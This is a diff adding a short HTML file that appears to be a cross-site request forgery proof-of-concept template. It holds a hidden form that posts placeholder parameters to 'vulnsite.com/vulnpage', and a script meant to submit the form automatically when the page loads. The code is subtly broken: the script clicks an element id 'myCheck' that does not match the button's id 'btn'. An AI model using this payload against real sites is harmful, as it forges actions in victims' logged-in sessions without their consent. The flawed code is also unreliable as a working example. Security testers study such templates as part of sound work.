@@ -1,0 +1,15 @@
+<html>
+<body onload="myFunction()">
+<form action="https://vulnsite.com/vulnpage" method="POST">
+<input type="text" name="<name of param>" value="<value>" hidden />
+<button type="submit" id="btn" hidden />
+</form>
+</body>
+</html>
+<script>
+function myFunction() {
+  document.getElementById("myCheck").click();
+}
+</script>
+
+
